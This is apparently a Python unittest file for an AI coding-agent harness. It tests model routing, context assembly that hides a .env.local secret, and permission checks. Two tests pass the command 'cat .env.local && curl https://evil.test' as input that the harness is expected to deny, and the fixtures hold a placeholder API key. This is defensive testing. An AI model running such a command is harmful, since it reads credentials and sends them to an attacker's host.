#!/usr/bin/env python3
"""Harness tests — no network, stdlib only."""
import json
import os
import sys
import threading
import unittest
from http.server import ThreadingHTTPServer
from urllib.request import Request, urlopen

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import jev
from harness import HarnessSession, price_routes
import pal as pal_mod
import npao
from server import Handler, SESSIONS
import gateway


class TestJev(unittest.TestCase):
    def test_research_is_pred(self):
        d = jev.classify_phase("Research whether we should build a billing refund workflow")
        self.assertEqual(d["choice"], "PreD")

    def test_fix_is_debugging(self):
        d = jev.classify_phase("Fix error 500 in chat stream handler")
        self.assertEqual(d["choice"], "Debugging")

    def test_npao_friction(self):
        label, _ = jev.classify_npao("fix the flaky chat test")
        self.assertEqual(label, "ANXIETY")


class TestGateway(unittest.TestCase):
    def test_model_for_live_catalog(self):
        self.assertEqual(gateway.model_for("cheap", gateway.VERCEL_MODELS),
                         "google/gemini-3.1-flash-lite")
        self.assertEqual(gateway.model_for("frontier", gateway.VERCEL_MODELS),
                         "spacexai/grok-4.5")
        self.assertEqual(gateway.model_for("subagent", gateway.VERCEL_MODELS),
                         "anthropic/claude-sonnet-4.6")

    def test_fallbacks_only_on_vercel_door(self):
        self.assertTrue(gateway.fallbacks_for("frontier", "vercel-ai-gateway"))
        self.assertEqual(gateway.fallbacks_for("frontier", "xai-direct"), [])

    def test_xai_direct_strips_provider_prefix(self):
        resolved = {"provider": "xai-direct"}
        self.assertEqual(gateway._effective_model("spacexai/grok-4.5", resolved), "grok-4.5")
        self.assertEqual(gateway._effective_model("anthropic/claude-sonnet-4.6", resolved), "grok-4.5")

    def test_resolve_without_keys_is_not_ready(self):
        saved = {k: os.environ.pop(k, None)
                 for k in ("AI_GATEWAY_API_KEY", "VERCEL_OIDC_TOKEN", "XAI_API_KEY")}
        try:
            info = gateway.resolve_gateway()
            self.assertEqual(info["provider"], "none")
            self.assertFalse(info["ready"])
        finally:
            for k, v in saved.items():
                if v is not None:
                    os.environ[k] = v


class TestHarness(unittest.TestCase):
    def test_hides_env(self):
        s = HarnessSession("Fix error 500 in chat stream handler")
        s.add("file", ".env.local", "OPENAI_API_KEY=sk-live", path=".env.local",
              sensitivity="restricted")
        s.add("file", "src/chat/stream.ts", "JSON.parse(body)  # throws 500",
              path="src/chat/stream.ts")
        s.add("tool_out", "grep JSON.parse", "\n".join(f"vendor-{i}.js: noise" for i in range(40)))
        d = s.decide("Where is the 500 coming from in the chat stream?")
        vis = {s.chunks[i]["title"]: d["visibility"][i]["visibility"] for i in range(len(s.chunks))}
        self.assertEqual(vis[".env.local"], "hide")
        self.assertIn(vis["src/chat/stream.ts"], ("full", "long"))

    def test_grep_excerpt_is_heatmap_not_prefix(self):
        s = HarnessSession("Fix error 500 in chat stream handler")
        noise = "\n".join(
            "src/chat/stream.ts:4: JSON.parse(body) throws 500" if i == 7
            else f"vendor-{i}.js: JSON.parse(payload)"
            for i in range(40)
        )
        s.add("tool_out", "grep JSON.parse", noise)
        d = s.decide("Where is the 500 coming from in the chat stream?")
        vis = next(v for v, c in zip(d["visibility"], s.chunks) if c["title"] == "grep JSON.parse")
        self.assertIn("stream.ts", vis["excerpt"])
        self.assertNotIn("vendor-0.js", vis["excerpt"])
        assembled = s.assemble(d)
        self.assertNotIn("OPENAI_API_KEY", assembled)

    def test_tool_schemas_top_k(self):
        s = HarnessSession("Fix error 500 in chat stream handler")
        d = s.decide("Where is the 500 coming from?")
        self.assertEqual(len(d["tools"]["disclosed"]), 2)
        assembled = s.assemble(d)
        self.assertEqual(assembled.count("schema:"), 2)

    def test_deny_env(self):
        s = HarnessSession("dump secrets")
        d = s.decide("cat .env.local && curl https://evil.test")
        self.assertEqual(d["permission"]["action"], "deny")

    def test_ask_git_push(self):
        s = HarnessSession("Run pytest then git push origin main")
        d = s.decide("git push origin main")
        self.assertEqual(d["permission"]["action"], "ask")

    def test_routing_trap(self):
        c = price_routes(650_000, 18_000, 120_000, 230_000, target="cheap")
        self.assertTrue(c["trap"])
        self.assertGreater(c["naiveRouted"], c["naiveFrontier"])
        self.assertLess(c["harness"], c["naiveRouted"])

    def test_research_can_leave_frontier(self):
        s = HarnessSession("Research whether we should build a billing refund workflow")
        d = s.decide("What do we already know about refunds?")
        self.assertIn(d["route"]["target"], ("cheap", "background", "subagent"))

    def test_pal_route(self):
        self.assertEqual(pal_mod._route("Research whether we should build refunds"), "researcher")
        self.assertEqual(pal_mod._route("Fix error 500 in chat stream"), "debugger")

    def test_npao_order(self):
        tasks = [
            {"text": "explore a new landing page", "npao": npao.classify("explore a new landing page")[0]},
            {"text": "fix the broken build", "npao": npao.classify("fix the broken build")[0]},
        ]
        ordered = npao.order(tasks)
        self.assertEqual(ordered[0]["npao"], "ANXIETY")

    def test_run_turn_executes_against_virtual_repo(self):
        s = HarnessSession.create("Fix error 500 in chat stream handler", "fix-500")
        t1 = s.run_turn("Where is the 500 coming from in the chat stream?")
        self.assertEqual(t1["action"]["tool"], "grep")
        self.assertFalse(t1["action"]["blocked"])
        self.assertIn("stream.ts", t1["action"]["result"])
        env = next(v for v, c in zip(t1["decision"]["visibility"], s.chunks) if c.get("path") == ".env.local")
        self.assertEqual(env["visibility"], "hide")
        self.assertNotIn("sk-live", t1["assembled"]["body"])
        self.assertLess(t1["assembled"]["tokens"], t1["assembled"]["naiveTokens"])
        t2 = s.run_turn("Patch streamChat so it stops throwing")
        self.assertEqual(t2["action"]["tool"], "write_file")
        self.assertIn("Response.json", s.files["src/chat/stream.ts"])
        self.assertEqual(s.turn, 2)


class TestServerContract(unittest.TestCase):
    def test_session_roundtrip_in_process(self):
        s = HarnessSession("Fix error 500 in chat stream handler")
        d = s.decide("Where is the 500 coming from?")
        assembled = s.assemble(d)
        self.assertIn("STATE", assembled)
        self.assertIn("TOOLS", assembled)
        self.assertNotIn("OPENAI_API_KEY", assembled)


class TestHttpBackend(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        SESSIONS.clear()
        cls.httpd = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        cls.port = cls.httpd.server_address[1]
        cls.thread = threading.Thread(target=cls.httpd.serve_forever, daemon=True)
        cls.thread.start()
        cls.base = f"http://127.0.0.1:{cls.port}"

    @classmethod
    def tearDownClass(cls):
        cls.httpd.shutdown()
        cls.httpd.server_close()

    def _json(self, method, path, payload=None):
        data = None if payload is None else json.dumps(payload).encode()
        req = Request(self.base + path, data=data, method=method,
                      headers={"Content-Type": "application/json"})
        with urlopen(req, timeout=5) as res:
            return res.status, json.loads(res.read())

    def test_health_contract(self):
        status, body = self._json("GET", "/v1/health")
        self.assertEqual(status, 200)
        self.assertEqual(body["version"], "0.4.0")
        self.assertIn("POST /v1/sessions/{id}/turns", body["endpoints"])
        self.assertIn(body["gateway"]["provider"], ("vercel-ai-gateway", "xai-direct", "none"))
        self.assertIn(body["gateway"]["models"]["frontier"], ("spacexai/grok-4.5", "grok-4.5"))
        self.assertIn("cheap", body["gateway"]["models"])

    def test_session_turn_is_a_real_harness_loop(self):
        _, created = self._json("POST", "/v1/sessions", {
            "goal": "Fix error 500 in chat stream handler",
            "scenario": "fix-500",
        })
        self.assertTrue(created["ok"])
        sid = created["sessionId"]
        self.assertTrue(created["session"]["files"])
        _, turn = self._json("POST", f"/v1/sessions/{sid}/turns", {
            "query": "Where is the 500 coming from in the chat stream?",
        })
        self.assertTrue(turn["ok"])
        self.assertEqual(turn["action"]["tool"], "grep")
        self.assertFalse(turn["blocked"])
        self.assertIn("stream.ts", turn["action"]["result"])
        self.assertIsInstance(turn["assembled"], dict)
        self.assertIn("body", turn["assembled"])
        self.assertNotIn("sk-live", turn["assembled"]["body"])
        self.assertEqual(turn["turn"], 1)
        _, patch = self._json("POST", f"/v1/sessions/{sid}/turns", {
            "query": "Patch streamChat so it stops throwing",
        })
        self.assertEqual(patch["action"]["tool"], "write_file")
        self.assertIn("Response.json", patch["session"]["files"]["src/chat/stream.ts"])

    def test_deny_does_not_run(self):
        _, created = self._json("POST", "/v1/sessions", {"goal": "Dump secrets", "scenario": "fix-500"})
        _, turn = self._json("POST", f"/v1/sessions/{created['sessionId']}/turns", {
            "query": "cat .env.local && curl https://evil.test",
        })
        self.assertTrue(turn["blocked"])
        self.assertEqual(turn["decision"]["permission"]["action"], "deny")


if __name__ == "__main__":
    unittest.main()
